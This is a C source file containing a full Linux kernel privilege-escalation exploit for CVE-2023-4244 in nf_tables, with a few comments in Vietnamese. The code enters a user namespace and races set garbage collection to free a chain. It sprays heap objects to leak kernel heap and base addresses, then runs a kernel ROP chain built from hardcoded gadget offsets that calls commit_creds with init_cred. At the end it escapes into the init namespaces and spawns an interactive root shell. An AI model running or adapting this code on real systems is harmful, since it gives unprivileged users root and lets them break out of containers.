#define _GNU_SOURCE

#include <errno.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/table.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>

#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <assert.h>
#include <inttypes.h>
#include <pthread.h>

#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <arpa/inet.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) fprintf(stderr, "[-] %s:%d: %s: %s\n", __func__, __LINE__, msg, strerror(errno))

#define SPRAY_BATCH 32
#define SPRAY_BATCH_SIZE 64

#define NOTRACK_OPS 0x1b26ec0
#define CVE_2023_4244_GC_INTERVAL 1

#define INIT_NSPROXY 0x26765c0
#define COMMIT_CREDS 0x1bed10
#define FIND_TASK_BY_VPID 0x1b5600
#define SWITCH_TASK_NAMESPACES 0x1bd180
#define KPTI_TRAMPOLINE 0x1201090 + 54 // swapgs_restore_regs_and_return_to_usermode + offset
#define INIT_CRED 0x2676800

#define PUSH_RSI_JMP_QWORD_PTR_RSI_F 0xd8dac5 // push rsi ; jmp qword ptr [rsi + 0xf]
#define POP_RSP_R13_R14_R15_RET 0x1dc645 // pop rsp ; pop r13 ; pop r14 ; pop r15 ; jmp 0xffffffff812449f0 (smp_call_function_single_async) -> ret
#define POP_RDI_RET 0x12cfc0 // pop rdi ; ret
#define POP_RSI_RET 0x128ae9 // pop rsi ; ret
#define POP_RDX_RET 0x0bf3d2 // pop rdx ; ret
#define MOV_RDI_RAX_RET 0x6d014a // mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404b80 (__x86_return_thunk) -> ret

static uint64_t user_cs, user_ss, user_rflags, user_sp;
static uint64_t CVE_2023_4244_EXPIRATION = 0;
static uint64_t vmlinux, heap, rule_handle;

struct list_head {
    struct list_head *next, *prev;
};

struct rhash_head {
    struct rhash_head* next;
};

struct rhlist_head {
    struct rhash_head rhead;
    struct rhlist_head* next;
};

struct msg_msgseg {
    struct msg_msgseg* next;
};

struct nft_expr {
    struct nft_expr_ops* ops;
    unsigned char data[]
        __attribute__((aligned(__alignof__(uint64_t))));
};

struct nft_rule {
    struct list_head list;
    uint64_t handle : 42,
        genmask : 2,
        dlen : 12,
        udata : 1;
    unsigned char data[]
        __attribute__((aligned(__alignof__(struct nft_expr))));
};

struct nft_rule_dp {
    uint64_t is_last : 1,
        dlen : 12,
        handle : 42; /* for tracing */
    unsigned char data[]
        __attribute__((aligned(__alignof__(struct nft_expr))));
};

struct nft_rule_blob {
    unsigned long size;
    unsigned char data[]
        __attribute__((aligned(__alignof__(struct nft_rule_dp))));
};

struct nft_chain {
    struct nft_rule_blob* blob_gen_0;
    struct nft_rule_blob* blob_gen_1;
    struct list_head rules;
    struct list_head list;
    struct rhlist_head rhlhead;
    struct nft_table* table;
    uint64_t handle;
    uint32_t use;
    uint8_t flags : 5,
        bound : 1,
        genmask : 2;
    char* name;
    uint16_t udlen;
    uint8_t* udata;

    /* Only used during control plane commit phase: */
    struct nft_rule_blob* blob_next;
};

struct nft_userdata {
    uint8_t len;
    unsigned char data[];
};

typedef struct mnl_socket* sock;
typedef struct mnl_nlmsg_batch* batch;
typedef struct nlmsghdr* nlmsghdr;
typedef struct nftnl_table* table;
typedef struct nftnl_set* set;
typedef struct nftnl_set_elem* set_elem;
typedef struct nftnl_chain* chain;
typedef struct nftnl_rule* rule;
typedef struct nftnl_expr* expr;

static sock nlsock;
static const uint16_t family = NFPROTO_IPV4;
static uint32_t seq = 1, rseq = 1;

char current_table_name[100];
uint32_t current_table_n = 0;
char free_chain_name[192];

static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
}

void monke()
{
    INFO("Return to monke");

    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char* args[] = { "/bin/bash", "-i", NULL };
    execve(args[0], args, NULL);
}

void write_to_file(const char* which, const char* format, ...)
{
    FILE* fu = fopen(which, "w");
    va_list args;
    va_start(args, format);
    if (vfprintf(fu, format, args) < 0) {
        ERROR("cannot write");
        exit(1);
    }
    fclose(fu);
}

int setup(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    // In order to use nf_tables, we need CAP_NET_ADMIN
    INFO("Setting up user namespace");

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
        ERROR("unshare(CLONE_NEWUSER | CLONE_NEWNET)");
        return -1;
    }

    // Pin process to a single CPU to avoid nf_tables allocations to spill over different slabs
    INFO("Pinning process to CPU #0");

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        return -1;
    }

    // now we map uid and gid
    write_to_file("/proc/self/uid_map", "0 %d 1", uid);
    // deny setgroups (see user_namespaces(7))
    write_to_file("/proc/self/setgroups", "deny");
    // remap gid
    write_to_file("/proc/self/gid_map", "0 %d 1", gid);

    INFO("Creating netfilter netlink socket");
    if ((nlsock = mnl_socket_open(NETLINK_NETFILTER)) == NULL) {
        ERROR("mnl_socket_open(NETLINK_NETFILTER)");
        return -1;
    }

    return 0;
}

static table make_table(const char* name, const void* udata, uint32_t udlen)
{
    table t = nftnl_table_alloc();
    if (t == NULL) {
        ERROR("Couldn't allocate a table");
        exit(EXIT_FAILURE);
    }

    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

    if (udata != NULL && udlen > 0)
        nftnl_table_set_data(t, NFTNL_TABLE_USERDATA, udata, udlen);

    return t;
}

static set make_set(const char* table, const char* name, uint32_t flags)
{
    set s = nftnl_set_alloc();
    if (s == NULL) {
        ERROR("Couldn't allocate a set");
        exit(EXIT_FAILURE);
    }

    nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
    nftnl_set_set_str(s, NFTNL_SET_NAME, name);
    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, sizeof(uint16_t));
    /* inet service type, see nftables/include/datatypes.h */
    nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, 13);
    nftnl_set_set_u32(s, NFTNL_SET_ID, 1);

    nftnl_set_set_u32(s, NFTNL_SET_GC_INTERVAL, CVE_2023_4244_GC_INTERVAL); // CVE_2023_4244
    nftnl_set_set_u32(s, NFTNL_SET_FLAGS, flags);
    nftnl_set_set_u32(s, NFTNL_SET_DATA_TYPE, NFT_DATA_VERDICT);

    return s;
}

static set make_set_elems(const char* table, const char* name, uint16_t key, const char* target_chain)
{
    set s = nftnl_set_alloc();
    if (s == NULL) {
        ERROR("Couldn't allocate a set");
        exit(EXIT_FAILURE);
    }

    set_elem e = nftnl_set_elem_alloc();
    if (e == NULL) {
        ERROR("Couldn't allocate a set elem");
        exit(EXIT_FAILURE);
    }

    nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
    nftnl_set_set_str(s, NFTNL_SET_NAME, name);

    if (key) {
        nftnl_set_elem_set(e, NFTNL_SET_ELEM_KEY, &key, sizeof(key));
    }

    if (target_chain) {
        nftnl_set_elem_set_u32(e, NFTNL_SET_ELEM_VERDICT, NFT_JUMP);
        nftnl_set_elem_set_str(e, NFTNL_SET_ELEM_CHAIN, target_chain);
    }

    nftnl_set_elem_set_u32(e, NFTNL_SET_ELEM_EXPIRATION, CVE_2023_4244_EXPIRATION); // CVE_2023_4244

    nftnl_set_elem_add(s, e);

    return s;
}

static set make_set_elems_catchall(const char* table, const char* name, const char* target_chain)
{
    set s = nftnl_set_alloc();
    if (s == NULL) {
        ERROR("Couldn't allocate a set");
        exit(EXIT_FAILURE);
    }

    set_elem e = nftnl_set_elem_alloc();
    if (e == NULL) {
        ERROR("Couldn't allocate a set elem");
        exit(EXIT_FAILURE);
    }

    nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
    nftnl_set_set_str(s, NFTNL_SET_NAME, name);

    nftnl_set_elem_set_u32(e, NFTNL_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL);

    if (target_chain) {
        nftnl_set_elem_set_u32(e, NFTNL_SET_ELEM_VERDICT, NFT_JUMP);
        nftnl_set_elem_set_str(e, NFTNL_SET_ELEM_CHAIN, target_chain);
    }

    nftnl_set_elem_set_u64(e, NFTNL_SET_ELEM_EXPIRATION, CVE_2023_4244_EXPIRATION); // CVE_2023_4244
    nftnl_set_elem_set_u64(e, NFTNL_SET_ELEM_TIMEOUT, 1); // CVE_2023_4244

    nftnl_set_elem_add(s, e);

    return s;
}

static chain make_chain(const char* table, const char* name, uint32_t flags)
{
    chain c = nftnl_chain_alloc();
    if (c == NULL) {
        ERROR("Couldn't allocate a chain");
        exit(EXIT_FAILURE);
    }

    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table);
    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, name);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_FLAGS, flags);

    return c;
}

static rule make_rule(const char* table, const char* chain, expr* exprs, size_t num_exprs, const void* udata, uint32_t udlen, uint64_t handle)
{
    rule r = nftnl_rule_alloc();
    if (r == NULL) {
        ERROR("Couldn't allocate a rule");
        return NULL;
    }

    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);

    for (int i = 0; i < num_exprs; ++i)
        nftnl_rule_add_expr(r, exprs[i]);

    if (udlen > 0)
        nftnl_rule_set_data(r, NFTNL_RULE_USERDATA, udata, udlen);

    if (handle > 0)
        nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, handle);

    return r;
}

static expr make_immediate_jump_expr(const char* target_chain)
{
    expr e = nftnl_expr_alloc("immediate");
    if (e == NULL)
        return NULL;

    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, NFT_JUMP);
    nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, target_chain);

    return e;
}

static expr make_notrack_expr()
{
    return nftnl_expr_alloc("notrack");
}

static batch batch_init(size_t size)
{
    void* buf = malloc(size);
    batch b = mnl_nlmsg_batch_start(buf, size);
    nftnl_batch_begin(mnl_nlmsg_batch_current(b), seq++);
    mnl_nlmsg_batch_next(b);
    rseq = seq;
    return b;
}

static void batch_end(batch b)
{
    nftnl_batch_end(mnl_nlmsg_batch_current(b), seq);
    mnl_nlmsg_batch_next(b);
}

static ssize_t batch_send(batch b, sock s)
{
    return mnl_socket_sendto(s, mnl_nlmsg_batch_head(b), mnl_nlmsg_batch_size(b));
}

static void batch_free(batch b)
{
    void* buf = mnl_nlmsg_batch_head(b);
    mnl_nlmsg_batch_stop(b);
    free(buf);
}

static void batch_new_table(batch b, table t)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWTABLE, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_table_nlmsg_build_payload(hdr, t);
    mnl_nlmsg_batch_next(b);
}

static void batch_new_set(batch b, set s)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWSET, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_set_nlmsg_build_payload(hdr, s);
    mnl_nlmsg_batch_next(b);
}

static void batch_del_set(batch b, set s)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_DELSET, family, NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(hdr, s);
    mnl_nlmsg_batch_next(b);
}

static void batch_new_set_elems(batch b, set s)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWSETELEM, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL, seq++);
    nftnl_set_elems_nlmsg_build_payload(hdr, s);
    mnl_nlmsg_batch_next(b);
}

static void batch_del_set_elems(batch b, set s)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_DELSETELEM, family, NLM_F_ACK, seq++);
    nftnl_set_elems_nlmsg_build_payload(hdr, s);
    mnl_nlmsg_batch_next(b);
}

static void batch_new_chain(batch b, chain c)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWCHAIN, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c);
    mnl_nlmsg_batch_next(b);
}

static void batch_del_chain(batch b, chain c)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_DELCHAIN, family, NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(hdr, c);
    mnl_nlmsg_batch_next(b);
}

static void batch_new_rule(batch b, rule r)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_NEWRULE, family, NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);
    mnl_nlmsg_batch_next(b);
}

static void batch_del_rule(batch b, rule r)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(b), NFT_MSG_DELRULE, family, NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);
    mnl_nlmsg_batch_next(b);
}

static nlmsghdr dump_rule(rule r, char* buf)
{
    nlmsghdr hdr = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, family, NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(hdr, r);
    return hdr;
}

static int run_callbacks(sock s, mnl_cb_t cb, void* data)
{
    // INFO("Start callback: rseq = %d, seq = %d", rseq, seq);
    char buf[MNL_SOCKET_BUFFER_SIZE];
    int ret = 0;
    while (rseq < seq) {
        ret = mnl_socket_recvfrom(s, buf, sizeof(buf));
        if (ret <= 0)
            break;
        ret = mnl_cb_run(buf, ret, rseq, mnl_socket_get_portid(s), cb, data);
        if (ret < 0)
            break;
        rseq += ret == 0;
    }
    // INFO("End callback: rseq = %d, seq = %d", rseq, seq);
    return ret;
}

// tạo set có gc interval 1
// add elem có expiration n
// end batch để elem được tháo busy, => gc có thể xử lý
// delset -> nft_map_deactivate -> nft_map_catchall_deactivate (không mark busy)
// gc chạy lúc này là ngon (sau deactivate, trước khi commit)
// => chọn n để elem expiration sau deactivate, trước khi commit

static int trigger_uaf()
{
    current_table_n += 1;
    snprintf(current_table_name, sizeof(current_table_name), "current_table_%d", current_table_n);

    CVE_2023_4244_EXPIRATION += 1;
    CVE_2023_4244_EXPIRATION = CVE_2023_4244_EXPIRATION % 10;

    // BATCH 1
    table t = make_table(current_table_name, NULL, 0);
    chain c_free = make_chain(current_table_name, free_chain_name, 0);
    chain c_primitive = make_chain(current_table_name, "primitive", 0);
    expr e_primitive = make_immediate_jump_expr(free_chain_name);
    rule r_primitive = make_rule(current_table_name, "primitive", &e_primitive, 1, NULL, 0, 0);

    chain c_spray = make_chain(current_table_name, "spray_chain", 0);

    batch b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_new_table(b, t);
    batch_new_chain(b, c_free);
    batch_new_chain(b, c_primitive);
    batch_new_rule(b, r_primitive);
    batch_new_chain(b, c_spray);

    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks");
        return -1;
    }

    // BATCH 2: batch này phải complete để elem được tháo busy
    INFO("elem with EXPIRATION = %d", CVE_2023_4244_EXPIRATION);
    set s = make_set(current_table_name, "race_set", NFT_SET_MAP | NFT_SET_TIMEOUT);
    set e = make_set_elems_catchall(current_table_name, "race_set", free_chain_name);

    b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_new_set(b, s);
    batch_new_set_elems(b, e);

    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks");
        return -1;
    }

    // BATCH 3: delset
    set del_s = make_set(current_table_name, "race_set", 0);

    b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_del_set(b, s);

    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks");
        return -1;
    }

    sleep(1); // wait for race

    // BATCH 4: nếu race thành công thì sẽ free được
    chain del_c_free = make_chain(current_table_name, free_chain_name, 0);

    b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_del_chain(b, del_c_free);

    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks - race failed. run again");
        return trigger_uaf();
    }

    sleep(1); // wait for commit_release del chain
    return 0;
}

static int dump_expr_leak_heap(expr e, void* data)
{
    const char* leaked_data;

    leaked_data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    if (strlen(leaked_data) < 17) // list + handle
        return MNL_CB_OK;

    struct nft_rule* r = (struct nft_rule*)leaked_data;
    heap = (uint64_t)r->list.next;
    rule_handle = (r->handle & 0xffff) + 1; // we got the address of the next rule, handle should be +1
    if ((heap & 0xff) == 0x90 || (heap & 0xff) == 0x10) { // we got leak to spray chain (rules list at offset 0x10 of nft_chain)
        heap = (uint64_t)r->list.prev; // get address of a rule instead
        rule_handle = (r->handle & 0xffff) - 1; // we got the address of the previous rule, handle should be -1
    }
    INFO("heap = 0x%lx, rule_handle = %lu", heap, rule_handle);

    return MNL_CB_OK;
}

static int dump_exprs(const struct nlmsghdr* nlh, void* data)
{
    rule r = nftnl_rule_alloc();
    nftnl_rule_nlmsg_parse(nlh, r);

    nftnl_expr_foreach(r, data, NULL);

    nftnl_rule_free(r);
    return MNL_CB_OK;
}

// spray kmalloc-cg-192
// SPRAY_BATCH batch
// mỗi batch có SPRAY_BATCH_SIZE rules
// rule có thêm udata để nhảy vào kmalloc-cg-192

// rule này nên có expr notrack để sau này leak vmlinux
static int leak_heap()
{
    batch b;
    expr e_notrack_spray;
    rule r_spray;

    char udata[192];
    memset(udata, 0, sizeof(udata));

    e_notrack_spray = make_notrack_expr();
    r_spray = make_rule(current_table_name, "spray_chain", &e_notrack_spray, 1, udata, 192 - sizeof(struct nft_rule) - 8 - 10, 0);

    for (int i = 0; i < SPRAY_BATCH; i++) {
        b = batch_init(1048576);
        for (int j = 0; j < SPRAY_BATCH_SIZE; j++) {
            batch_new_rule(b, r_spray);
        }

        batch_end(b);
        if (batch_send(b, nlsock) == -1) {
            ERROR("batch_send");
            return -1;
        }
        batch_free(b);
        if (run_callbacks(nlsock, NULL, NULL) < 0) {
            ERROR("run_callbacks");
            return -1;
        }
    }

    char buf[MNL_SOCKET_BUFFER_SIZE];

    rule r_primitive = make_rule(current_table_name, "primitive", NULL, 0, NULL, 0, 3); // the primitive rule has handle = 3
    rseq = seq;
    nlmsghdr hdr = dump_rule(r_primitive, buf);
    if (mnl_socket_sendto(nlsock, buf, hdr->nlmsg_len) < 0) {
        ERROR("mnl_socket_sendto");
        return -1;
    }
    if (run_callbacks(nlsock, dump_exprs, dump_expr_leak_heap) < 0) {
        ERROR("run_callbacks leak_heap: primitive");
        return -1;
    }

    return 0;
}

static int dump_vmlinux(expr e, void* data)
{
    const char* leaked_data;

    leaked_data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    if (strlen(leaked_data) < 8) // notrack ops
        return MNL_CB_OK;

    vmlinux = *(uint64_t*)leaked_data - NOTRACK_OPS;

    INFO("vmlinux = 0x%lx", vmlinux);

    return MNL_CB_OK;
}

// nft_chain:
// - GFP_KERNEL_ACCOUNT
// - size = 120 -> kmalloc-cg-128
//
// spray kmalloc-cg-128 to reclaim freed chain:
// spray with nft_table->udata => ok. sizeof(nft_table) != sizeof(nft_chain)
// spray with nft_chain->data => !ok. sizeof(nft_chain) == sizeof(nft_chain)
// spray with nft_rule => !ok. flat elastic
// ...

static int leak_vmlinux()
{
    batch b;
    table t;
    char buf_fake_chain[sizeof(struct nft_chain)];
    char spray_table_name[10];
    struct nft_chain* fake_chain = (struct nft_chain*)buf_fake_chain;

    fake_chain->rules.next = (void*)heap;
    fake_chain->rules.prev = (void*)heap;
    fake_chain->flags = NFT_CHAIN_BINDING;
    fake_chain->name = (void*)&(((struct nft_rule*)heap)->data);

    for (int i = 0; i < SPRAY_BATCH; i++) {
        b = batch_init(1048576);

        for (int j = 0; j < SPRAY_BATCH_SIZE; j++) {
            memset(spray_table_name, 0, sizeof(spray_table_name));
            snprintf(spray_table_name, sizeof(spray_table_name), "table_spray_%d_%d", i, j);
            t = make_table(spray_table_name, buf_fake_chain, sizeof(buf_fake_chain));

            batch_new_table(b, t);
        }

        batch_end(b);
        if (batch_send(b, nlsock) == -1) {
            ERROR("batch_send");
            return -1;
        }
        batch_free(b);
        if (run_callbacks(nlsock, NULL, NULL) < 0) {
            ERROR("run_callbacks");
            return -1;
        }
    }

    char buf[MNL_SOCKET_BUFFER_SIZE];

    rule r_primitive = make_rule(current_table_name, "primitive", NULL, 0, NULL, 0, 3); // the primitive rule has handle = 3
    rseq = seq;
    nlmsghdr hdr = dump_rule(r_primitive, buf);
    if (mnl_socket_sendto(nlsock, buf, hdr->nlmsg_len) < 0) {
        ERROR("mnl_socket_sendto");
        return -1;
    }
    if (run_callbacks(nlsock, dump_exprs, dump_vmlinux) < 0) {
        ERROR("run_callbacks leak_heap: primitive");
        return -1;
    }

    return 0;
}

// del leaked rule (kmalloc-cg-192)
// spray (kmalloc-cg-192)
// del primitive rule: fake_chain->flags & BINDING => nft_rule_expr_deactivate(fake_chain->rule) -> expr->ops->deactivate

static int spray_krop()
{
    batch b;

    rule leaked_rule = make_rule(current_table_name, "spray_chain", NULL, 0, NULL, 0, rule_handle);
    b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_del_rule(b, leaked_rule);
    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks");
        return -1;
    }

    sleep(1); // wait commit release

    char buf_fake_rule[192];
    memset(buf_fake_rule, 0, sizeof(buf_fake_rule));

    struct nft_rule* fake_rule = (struct nft_rule*)buf_fake_rule;
    struct nft_expr* fake_expr = (struct nft_expr*)(fake_rule->data);
    fake_rule->dlen = 1; // bypass nft_expr_more()
    fake_expr->ops = (void*)(heap + 0x88 - 0x28); // 0x28: offset of deactivate inside nft_expr_ops

    // pushed rsi (with rsi = fake_expr)
    *(uint64_t*)(&((char*)fake_expr)[0xf]) = vmlinux + POP_RSP_R13_R14_R15_RET;

    // commit_creds(&init_cred)
    *(uint64_t*)&buf_fake_rule[0x30] = vmlinux + POP_RDI_RET;
    *(uint64_t*)&buf_fake_rule[0x38] = vmlinux + INIT_CRED;
    *(uint64_t*)&buf_fake_rule[0x40] = vmlinux + COMMIT_CREDS;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    *(uint64_t*)&buf_fake_rule[0x48] = vmlinux + POP_RDI_RET;
    *(uint64_t*)&buf_fake_rule[0x50] = 1;
    *(uint64_t*)&buf_fake_rule[0x58] = vmlinux + FIND_TASK_BY_VPID;
    *(uint64_t*)&buf_fake_rule[0x60] = vmlinux + MOV_RDI_RAX_RET;
    *(uint64_t*)&buf_fake_rule[0x68] = vmlinux + POP_RSI_RET;
    *(uint64_t*)&buf_fake_rule[0x70] = vmlinux + INIT_NSPROXY;
    *(uint64_t*)&buf_fake_rule[0x78] = vmlinux + SWITCH_TASK_NAMESPACES;

    // return to userspace
    *(uint64_t*)&buf_fake_rule[0x80] = vmlinux + KPTI_TRAMPOLINE;
    *(uint64_t*)&buf_fake_rule[0x88] = vmlinux + PUSH_RSI_JMP_QWORD_PTR_RSI_F; // RSI == fake_expr
    // skip
    *(uint64_t*)&buf_fake_rule[0x98] = (uint64_t)monke;
    *(uint64_t*)&buf_fake_rule[0xa0] = (uint64_t)user_cs;
    *(uint64_t*)&buf_fake_rule[0xa8] = (uint64_t)user_rflags;
    *(uint64_t*)&buf_fake_rule[0xb0] = (uint64_t)user_sp;
    *(uint64_t*)&buf_fake_rule[0xb8] = (uint64_t)user_ss; // last 8 bytes of 192 bytes chunk :o

    // spray krop
    table t;
    char spray_krop_table_name[100];

    for (int i = 0; i < SPRAY_BATCH; i++) {
        b = batch_init(1048576);

        for (int j = 0; j < SPRAY_BATCH_SIZE; j++) {
            memset(spray_krop_table_name, 0, sizeof(spray_krop_table_name));
            snprintf(spray_krop_table_name, sizeof(spray_krop_table_name), "table_spray_krop_%d_%d", i, j);
            t = make_table(spray_krop_table_name, buf_fake_rule, sizeof(buf_fake_rule));

            batch_new_table(b, t);
        }

        batch_end(b);
        if (batch_send(b, nlsock) == -1) {
            ERROR("batch_send");
            return -1;
        }
        batch_free(b);
        if (run_callbacks(nlsock, NULL, NULL) < 0) {
            ERROR("run_callbacks");
            return -1;
        }
    }

    return 0;
}

// del primitive rule: fake_chain->flags & BINDING => nft_rule_expr_deactivate(fake_chain->rule) -> expr->ops->deactivate
static int escalate()
{
    batch b;

    rule del_rule = make_rule(current_table_name, "primitive", NULL, 0, NULL, 0, 3); // the primitive rule has handle = 3
    b = batch_init(MNL_SOCKET_BUFFER_SIZE * 2);
    batch_del_rule(b, del_rule);
    batch_end(b);
    if (batch_send(b, nlsock) == -1) {
        ERROR("batch_send");
        return -1;
    }
    batch_free(b);
    if (run_callbacks(nlsock, NULL, NULL) < 0) {
        ERROR("run_callbacks");
        return -1;
    }
}

int main()
{
    save_state();

    if (setup() == -1)
        return -1;
    // system("ip link set dev lo up"); // setting the loopback up

    memset(free_chain_name, 'A', 192);
    free_chain_name[192 - 1] = 0;

    while (heap < 0xffff000000000000) {
        if (trigger_uaf() < 0) {
            ERROR("trigger uaf failed");
            return -1;
        }

        if (leak_heap() < 0) {
            ERROR("leak heap failed");
            return -1;
        }
    }

    leak_vmlinux();

    spray_krop();

    escalate();

    return 0;
}